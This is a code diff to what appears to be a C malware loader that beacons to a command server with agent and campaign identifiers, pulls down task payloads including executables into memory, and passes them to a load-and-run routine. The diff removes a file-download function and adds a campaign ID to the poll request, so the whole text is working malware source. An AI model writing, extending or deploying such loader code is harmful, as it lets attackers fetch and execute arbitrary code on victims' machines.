@@ -8,80 +8,8 @@
 
 
 
-#ifdef LOAD_AND_EXIT
-
-LdrTask LdrPullFile() {
-	LdrTask task = {0};
-	ParserWrite *writer = ParserInitWrite();
-	if(!writer) {
-		task.ok = FALSE;
-		return task;
-	}
-
-	if(!NwLoadApis()) {
-		task.ok = FALSE;
-		return task;
-	}
-
-	if(!ParserWrite4(writer, MSG_GET_FILE)) {
-		task.ok = FALSE;
-		return task;
-	}
-	INT BytesWrote = ParserWriteBytes(writer, ldr->config->UserId, sizeof(ldr->config->UserId));
-	if(BytesWrote == 0) {
-		task.ok = FALSE;
-		return task;
-	}
-
-	BytesWrote = ParserWriteBytes(writer, ldr->config->AgentId, sizeof(ldr->config->AgentId));
-	if(BytesWrote == 0) {
-		task.ok = FALSE;
-		return task;
-	}
 
 
-	BytesWrote = ParserWriteBytes(writer, ldr->config->FileId, sizeof(ldr->config->FileId));
-	if(BytesWrote == 0) {
-		task.ok = FALSE;
-		return task;
-	}
-
-
-	DWORD payloadSize = 0;
-	PVOID payload = NwPollServer(&payloadSize,
-    ParserWriteReturnPointer(writer),
-    (DWORD)ParserWriteReturnSize(writer));
-	if(!payload) {
-		task.ok = FALSE;
-		return task;
-	}
-
-	ParserClearWrite(writer);
-
-	ParserRead *pr = ParserInitRead(payload, payloadSize);
-	task.code = ParserRead4(pr);
-	task.FileType = ParserRead4(pr);
-	if(task.FileType == FILE_EXE) {
-		task.hasReloc = ParserRead4(pr);
-	}
-	task.DataSize = ParserRead4(pr);
-
-	task.Data = ldr->win32->LocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, task.DataSize);
-    if(!task.Data) {
-        task.ok = FALSE;
-        ParserClearRead(pr);
-        return task;
-    }
-    ParserReadBytes(pr, task.Data, task.DataSize);
-    task.ok = TRUE;
-    ParserClearRead(pr);
-    ldr->win32->LocalFree(payload);
-    return task;
-}
-#endif
-
-
-#ifdef LOAD_AND_LISTEN
 
 static PBYTE  sPollBody;
 static DWORD  sPollSize;
@@ -91,8 +19,8 @@ void LdrInitPoll() {
     NwLoadApis();
     ParserWrite *writer = ParserInitWrite();
     ParserWrite4(writer, POLL_CODE);
-    ParserWriteBytes(writer, ldr->config->UserId, sizeof(ldr->config->UserId));
     ParserWriteBytes(writer, ldr->config->AgentId, sizeof(ldr->config->AgentId));
+    ParserWriteBytes(writer, ldr->config->CampaignID, sizeof(ldr->config->CampaignID));
     sPollBody = ParserWriteReturnPointer(writer);
     sPollSize = (DWORD)ParserWriteReturnSize(writer);
 }
@@ -114,6 +42,7 @@ LdrTask LdrPollServer() {
     task.code = ParserRead4(pr);
     if(task.code == TASK_NO_TASK) {
 		DBGA("[*] No task\n");
+        task.ok = TRUE;
         ParserClearRead(pr);
         ldr->win32->LocalFree(Addr);
         return task;
@@ -147,7 +76,6 @@ LdrTask LdrPollServer() {
     return task; 
 
 }
-#endif
 
 BOOL LdrLoadAndRun(LdrTask info, BOOL CleanUpAfter) {
 	switch (info.code) {
